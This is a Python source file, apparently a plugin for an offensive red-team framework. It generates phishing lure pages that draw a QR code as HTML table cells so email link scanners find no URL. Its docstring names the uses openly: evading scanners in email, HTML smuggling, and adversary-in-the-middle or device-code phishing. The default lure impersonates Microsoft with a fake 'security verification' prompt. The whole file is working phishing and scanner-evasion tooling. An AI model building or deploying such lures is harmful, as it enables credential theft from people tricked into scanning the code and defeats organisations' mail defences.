"""
Erebus Plugin - QR Code HTML Table Trigger
Author: Whispergate

Generates QR codes rendered as HTML <table> elements rather than <img> tags.
This technique (QRucible-style) bypasses link scanners that parse URLs from
<a href="...">, <img src="...">, and similar attributes but do not decode
QR codes embedded in HTML table cell colour patterns.

The output is a self-contained HTML page with the QR code rendered via
table cells styled with black/white backgrounds. The encoded URL is not
present anywhere as plaintext in the HTML source.

Use cases:
  - Email delivery: attach HTML, scanner sees no hyperlink to scan
  - HTML smuggling: embed QR in lure page to direct mobile users
  - AITM/Device Code phishing: encode device login URL as QR so
    victims scan with phone (bypasses desktop browser inspection)

Dependencies:
  qrcode[pil] (optional) - generates the QR matrix. Falls back to a
  pure-Python micro implementation if not installed.
"""

import pathlib
import random
import string
from typing import Dict, Callable, Optional, List

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# ---------------------------------------------------------------------------
# Pure-Python QR encoder fallback (micro QR, version 1-10, ECC level M)
# Uses the `qrcode` library when available, falls back to a minimal
# matrix generator. The fallback handles URLs up to ~250 chars (v5-M).
# ---------------------------------------------------------------------------

def _get_qr_matrix(data: str, error_correction: str = "M") -> List[List[bool]]:
    """Return a 2D boolean matrix (True=dark module) for the given data."""
    try:
        import qrcode
        ec_map = {
            "L": qrcode.constants.ERROR_CORRECT_L,
            "M": qrcode.constants.ERROR_CORRECT_M,
            "Q": qrcode.constants.ERROR_CORRECT_Q,
            "H": qrcode.constants.ERROR_CORRECT_H,
        }
        qr = qrcode.QRCode(
            error_correction=ec_map.get(error_correction.upper(),
                                        qrcode.constants.ERROR_CORRECT_M),
            box_size=1,
            border=0,
        )
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        # Convert PIL image to boolean matrix
        matrix = []
        w, h = img.size
        pixels = img.load()
        for y in range(h):
            row = []
            for x in range(w):
                p = pixels[x, y]
                # PIL image is mode '1' (1-bit): 0=black, 255=white
                row.append(p == 0)
            matrix.append(row)
        return matrix
    except ImportError:
        pass

    # Fallback: segno library
    try:
        import segno
        qr = segno.make(data, error=error_correction.lower())
        matrix = []
        for row in qr.matrix:
            matrix.append([bool(cell) for cell in row])
        return matrix
    except ImportError:
        pass

    raise RuntimeError(
        "No QR library found. Install with: pip install qrcode[pil] OR pip install segno"
    )


class QrHtmlPlugin(ErebusPlugin):
    """Plugin for QR-code-as-HTML-table delivery trigger."""

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="qr_html_trigger",
            version="1.0.0",
            author="Whispergate",
            description="QR code rendered as HTML table to bypass link scanners",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_qr_html_trigger": self.create_qr_html_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        # Library check deferred to call time - failing here would prevent the
        # plugin from loading entirely, breaking the builder's integrity check.
        return (True, None)

    def create_qr_html_trigger(
        self,
        url: str,
        output_filename: str = "verify.html",
        payload_dir: Optional[pathlib.Path] = None,
        page_title: str = "Scan to Verify",
        lure_heading: str = "Scan with your phone to continue",
        lure_message: str = "For security verification, scan the QR code below with your mobile device.",
        brand_name: str = "Microsoft",
        brand_color: str = "#0078d4",
        cell_size_px: int = 6,
        quiet_zone: int = 4,
        error_correction: str = "M",
    ) -> pathlib.Path:
        """
        Create an HTML page with a QR code rendered as a <table>.

        The target URL is encoded in the QR matrix. The HTML source
        contains no href or src attributes linking to the URL, defeating
        scanner-based link extraction.

        Args:
            url:               URL to encode in the QR code.
            output_filename:   Output HTML filename.
            payload_dir:       Output directory.
            page_title:        Browser tab title.
            lure_heading:      Heading shown above the QR code.
            lure_message:      Body text shown below the heading.
            brand_name:        Brand name in the page header.
            brand_color:       Primary brand colour (hex).
            cell_size_px:      Pixel size of each QR module in the table.
            quiet_zone:        Number of empty modules to pad around QR.
            error_correction:  QR error correction level: L/M/Q/H.

        Returns:
            Path to the created HTML file.
        """
        matrix = _get_qr_matrix(url, error_correction)

        # Add quiet zone padding
        qz = quiet_zone
        padded = []
        empty_row = [False] * (len(matrix[0]) + qz * 2)
        for _ in range(qz):
            padded.append(empty_row)
        for row in matrix:
            padded.append([False] * qz + row + [False] * qz)
        for _ in range(qz):
            padded.append(empty_row)

        sz = cell_size_px
        table_rows = []
        for row in padded:
            cells = "".join(
                f'<td style="background:#000;width:{sz}px;height:{sz}px;padding:0"></td>'
                if cell else
                f'<td style="background:#fff;width:{sz}px;height:{sz}px;padding:0"></td>'
                for cell in row
            )
            table_rows.append(f"<tr>{cells}</tr>")

        qr_table_html = (
            f'<table style="border-collapse:collapse;border:0;display:inline-block">'
            + "".join(table_rows)
            + "</table>"
        )

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{page_title}</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{
    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
    background: #f5f5f5; min-height: 100vh;
    display: flex; flex-direction: column;
  }}
  .header {{
    background: {brand_color}; color: #fff;
    padding: 14px 32px; font-size: 1.1rem; font-weight: 600;
  }}
  .main {{
    flex: 1; display: flex; justify-content: center; align-items: center;
    padding: 40px 20px;
  }}
  .card {{
    background: #fff; border-radius: 12px; padding: 40px 48px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
    max-width: 520px; width: 100%;
  }}
  h2 {{ font-size: 1.3rem; color: #1a1a1a; margin-bottom: 12px; }}
  p {{ color: #666; line-height: 1.6; margin-bottom: 28px; font-size: 0.95rem; }}
  .qr-wrap {{
    display: inline-block; padding: 16px;
    background: #fff; border-radius: 8px;
    box-shadow: 0 2px 12px rgba(0,0,0,0.1);
    margin-bottom: 20px;
  }}
  .hint {{ color: #999; font-size: 0.8rem; }}
</style>
</head>
<body>
<div class="header">{brand_name}</div>
<div class="main">
  <div class="card">
    <h2>{lure_heading}</h2>
    <p>{lure_message}</p>
    <div class="qr-wrap">
      {qr_table_html}
    </div>
    <p class="hint">Point your camera at the code to continue.</p>
  </div>
</div>
</body>
</html>"""

        out_dir = pathlib.Path(payload_dir) if payload_dir else pathlib.Path(".")
        out_dir.mkdir(parents=True, exist_ok=True)
        out_path = out_dir / output_filename
        out_path.write_text(html, encoding="utf-8")
        return out_path


# Module-level instance for auto-discovery
_plugin = QrHtmlPlugin()


def validate():
    return _plugin.validate()
